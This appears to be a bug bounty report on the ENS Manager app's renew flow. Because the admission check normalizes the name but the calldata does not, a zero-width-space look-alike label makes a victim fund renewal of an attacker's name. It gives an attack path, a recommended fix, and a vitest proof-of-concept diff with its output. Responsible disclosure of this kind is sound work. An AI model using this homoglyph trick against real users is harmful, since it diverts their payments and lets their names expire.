# 90638 w a critical renew gate reads one name renew calldata spends on another

**Submitted on Aug 26th 2026 at 04:54:18 UTC by @QED for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90638
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Direct theft of user funds

## Description

## Brief/Intro

The Manager app (`apps/manager`) renews `.eth` names. Its renew route takes the name from the URL. The route's admission check reads the expiry of the **ENSIP-15 normalized** form of that name from chain, so the confirm screen shows the victim's real expiry. The label it hands to the renewal machine, and from there into `renew()` calldata, is the **raw, unnormalized** URL string. When the two differ the user pays to extend a name that is not the one the screen described. The renewal is paid in an ERC-20 token, and the flow's only pre-flight contract check is that the payment token is whitelisted — it never reads the name's owner — so the money moves to an attacker's name while the victim's name keeps counting down. The app is Sepolia-only (`packages/transaction-manager/src/contracts/ens-sepolia.ts`).

Commit: `1c9b47f18fcddd2e864dfe385c4171061c9811ae`

## Vulnerability Details

### Root Cause

Two functions in one route loader disagree about what the route param means. The expiry query normalizes with viem's `normalize`, which is ENSIP-15. The name parser only lowercases and trims, then rejects a fixed list of punctuation. JavaScript's `\s` does not match U+200B ZERO WIDTH SPACE, and U+200B is not in that punctuation list, so the codepoint survives the parser and dies in the normalizer. The loader therefore gates on `alice.eth` and returns the label `alice\u200B`.

The parse happens at [`renew/$name.tsx:20`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/routes/renew/%24name.tsx#L20) and its raw label is returned to the page at [`:61-62`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/routes/renew/%24name.tsx#L61-L62), alongside the expiry read for the normalized name. The normalizing side is [`profileExpiry.ts:77`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/profile/service/profileExpiry.ts#L77). The non-normalizing side is [`name-parser.ts:46`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/register-v2/utils/name-parser.ts#L46) with the character filter at [`:73`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/register-v2/utils/name-parser.ts#L73); there is no `ens_normalize` call anywhere in that file. The label goes into calldata verbatim at [`registration.actors.ts:1020-1031`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/packages/transaction-manager/src/machines/registration/registration.actors.ts#L1020-L1031), and the confirm screen renders the same raw label as the domain name at [`RenewalDetails.tsx:50`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/renew/workflow/renewing/components/RenewalDetails.tsx#L50).

### Attack Path

{% stepper %}
{% step %}

## Victim owns `alice.eth`

The victim owns `alice.eth` on Sepolia and it is inside the renewal window.
{% endstep %}

{% step %}

## Attacker registers a visually confusable name

The attacker registers `alice\u200B.eth` by calling the registrar directly, bypassing the app inputs that reject non-normalized labels.
{% endstep %}

{% step %}

## Victim visits the crafted renewal URL

The victim reaches `/renew/alice%E2%80%8B.eth` — from a link, a bookmark, or a name list.
{% endstep %}

{% step %}

## Loader validates the normalized name

The loader normalizes for its checks, reads `alice.eth` from chain, and lets the page render.
{% endstep %}

{% step %}

## Renewal details appear legitimate

The screen shows `alice.eth` (U+200B is invisible), the victim's real current expiry, and the new expiry it would have.
{% endstep %}

{% step %}

## Victim submits the renewal

The victim approves the ERC-20 spend and submits. The `renew()` first argument is `alice\u200B`.
{% endstep %}

{% step %}

## Attacker's name is renewed

The attacker's name gains a year of registration paid for by the victim. `alice.eth` still expires on its original date, and the victim has been told it was renewed.
{% endstep %}
{% endstepper %}

## Impact Details

The victim spends money on an asset they do not own, and the name they meant to protect is left to expire while the app reports success. Once it expires the name is open to anyone. The loss is the renewal fee plus, on the victim believing the success screen, the name itself.

## References

* `apps/manager/src/routes/renew/$name.tsx`
* `apps/manager/src/features/profile/service/profileExpiry.ts`
* `apps/manager/src/features/register-v2/utils/name-parser.ts`
* `packages/transaction-manager/src/machines/registration/registration.actors.ts`

## Recommended Fix

Make the loader normalize once and use the result everywhere. `parseRenewableName` should run `ens_normalize` and return the normalized label, or reject a name that is not already normalized. Then the label whose expiry is read and the label placed in `renew()` are the same string by construction.

## Proof of Concept

The test reads all three values from product code: the label the loader hands to the page, the label whose expiry the loader read from chain, and the first argument of the `renew()` calldata that the transaction manager actually submits. The transaction manager provider is replaced so the outgoing request can be captured; the encoder itself is the real one.

Save the fenced diff below as `poc.diff` in the cloned repository root, then run:

```bash
git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae
git apply poc.diff
pnpm install --offline --ignore-scripts
cd apps/manager
npx vitest run src/features/renew/confusableRenew.poc.test.ts --reporter=verbose
```

```diff
diff --git a/apps/manager/src/features/renew/confusableRenew.poc.test.ts b/apps/manager/src/features/renew/confusableRenew.poc.test.ts
new file mode 100644
index 0000000..1041ed0
--- /dev/null
+++ b/apps/manager/src/features/renew/confusableRenew.poc.test.ts
@@ -0,0 +1,80 @@
+import { ethRegistrarRenewSnippet } from '@ensdomains/ensjs-abi/v2/ethRegistrar'
+import { type Address, createPublicClient, custom, decodeFunctionData, encodeAbiParameters, type Hex, labelhash, parseAbiParameters, toFunctionSelector } from 'viem'
+import { sepolia } from 'viem/chains'
+import { describe, expect, it, vi } from 'vitest'
+import { normalizeEth2LdName } from '@/features/profile/service/profileName'
+import { parseRenewableName } from '@/features/renew/utils/renewableName'
+
+const state = vi.hoisted(() => ({ started: [] as Array<{ data: Hex; description: string }> }))
+vi.mock('@ens-apps/transaction-manager/providers/transactionManager', () => ({
+  transactionManager: {
+    startTransaction: (plan: { request: { data: Hex } }, _s: unknown, o: { description: string }) => {
+      state.started.push({ data: plan.request.data, description: o.description })
+      return 'tx-poc'
+    },
+  },
+}))
+const { submitRenewActor } = await import('@ens-apps/transaction-manager/machines/registration/registration.actors')
+
+const VICTIM = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266' as Address
+const ORACLE = '0x000000000000000000000000000000000000da01' as Address
+const RENT_PRICE_ORACLE = toFunctionSelector('function rentPriceOracle() view returns (address)')
+const IS_PAYMENT_TOKEN = toFunctionSelector('function isPaymentToken(address) view returns (bool)')
+
+// The route param. "alice" + U+200B ZERO WIDTH SPACE; viem's normalize maps it to "alice".
+const RAW_NAME = 'alice​.eth'
+
+describe('manager renew: the gate normalizes, the calldata does not', () => {
+  it('reads one name from chain and renews a different one', async () => {
+    // 1. The loader's admission check (routes/renew/$name.tsx:20-21, :60-63).
+    const parsed = parseRenewableName(RAW_NAME)
+    expect(parsed.isOk()).toBe(true)
+    const routeLabel = parsed._unsafeUnwrap().label
+
+    // 2. The loader's expiry read (profileExpiry.ts:77). This is the name whose
+    //    on-chain expiry is fetched and shown on the confirm screen.
+    const gateLabel = (normalizeEth2LdName(RAW_NAME) as { label: string }).label
+
+    // 3. The calldata the renewal submits (registration.actors.ts:1039-1096).
+    const publicClient = createPublicClient({
+      chain: sepolia,
+      transport: custom({
+        async request({ method, params }) {
+          if (method === 'eth_chainId') return '0xaa36a7'
+          if (method !== 'eth_call') throw new Error(`unexpected ${method}`)
+          const data = (params as [{ data: Hex }])[0].data
+          if (data.slice(0, 10) === RENT_PRICE_ORACLE) return encodeAbiParameters(parseAbiParameters('address'), [ORACLE])
+          if (data.slice(0, 10) === IS_PAYMENT_TOKEN) return encodeAbiParameters(parseAbiParameters('bool'), [true])
+          throw new Error(`unexpected selector ${data.slice(0, 10)}`)
+        },
+      }),
+    })
+    const submitted = await submitRenewActor({
+      label: routeLabel,
+      duration: 31_536_000n,
+      selectedToken: 'USDC',
+      signer: { type: 'eoa', walletClient: { account: { address: VICTIM } } } as never,
+      publicClient,
+      id: 'poc',
+    })
+    expect(submitted.isOk()).toBe(true)
+
+    const sent = state.started[0] as { data: Hex; description: string }
+    const decoded = decodeFunctionData({ abi: ethRegistrarRenewSnippet, data: sent.data })
+    const renewedLabel = (decoded.args as readonly unknown[])[0] as string
+
+    console.log('route label (page + machine):', JSON.stringify(routeLabel))
+    console.log('label whose expiry was read :', JSON.stringify(gateLabel))
+    console.log('renew() first argument      :', JSON.stringify(renewedLabel))
+    console.log('labelhash(renewed)          :', labelhash(renewedLabel))
+    console.log('labelhash(expiry read)      :', labelhash(gateLabel))
+    console.log('description shown to user   :', JSON.stringify(sent.description))
+
+    expect(decoded.functionName).toBe('renew')
+    expect(renewedLabel).toBe(routeLabel)
+    expect(renewedLabel).not.toBe(gateLabel)
+    expect(labelhash(renewedLabel)).not.toBe(labelhash(gateLabel))
+    expect(renewedLabel).toContain('​')
+    expect(gateLabel).not.toContain('​')
+  })
+})
```

Output:

```
 RUN  v4.1.5 /tmp/claude-1000/-home-qed-bug-bounty/2a95be94-6b27-4117-831b-15c5753cf8da/scratchpad/wt-verify2/apps/manager

stdout | src/features/renew/confusableRenew.poc.test.ts > manager renew: the gate normalizes, the calldata does not > reads one name from chain and renews a different one
route label (page + machine): "alice​"
label whose expiry was read : "alice"
renew() first argument      : "alice​"
labelhash(renewed)          : 0x2707eeb0aa982f9b0e17abff4baeab5388557a5e5e5ed0e050e9da5da56807de
labelhash(expiry read)      : 0x9c0257114eb9399a2985f8e75dad7600c5d89fe3824ffa99ec1c3eb8bf3b0501
description shown to user   : "Renew alice​.eth"

 ✓ src/features/renew/confusableRenew.poc.test.ts > manager renew: the gate normalizes, the calldata does not > reads one name from chain and renews a different one 80ms

 Test Files  1 passed (1)
      Tests  1 passed (1)
   Start at  23:32:22
   Duration  629ms (transform 107ms, setup 0ms, import 403ms, tests 81ms, environment 83ms)
```

The two labelhashes are different resources on the registrar. The gate read one, the calldata spends on the other, and the description string carries the invisible codepoint straight to the user.
